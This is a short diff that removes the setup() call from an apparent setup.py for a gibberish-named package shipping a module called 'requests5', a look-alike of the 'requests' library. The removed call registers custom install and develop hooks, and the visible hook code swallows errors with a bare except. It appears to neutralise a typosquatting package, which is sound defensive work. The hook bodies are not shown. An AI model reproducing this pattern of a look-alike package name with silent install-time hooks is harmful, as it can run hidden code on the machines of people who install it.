@@ -63,12 +63,4 @@ class PostInstallCommand(install):
         except:
             pass
 
-setup(
-    name='fasdghjkhjafsd',
-    version='0.0.1',
-    py_modules=['requests5'],
-     cmdclass={
-        'develop': PostDevelopCommand,
-        'install': PostInstallCommand,
-    }
-)
+# setup(...) removed                                                                                                                                                                      
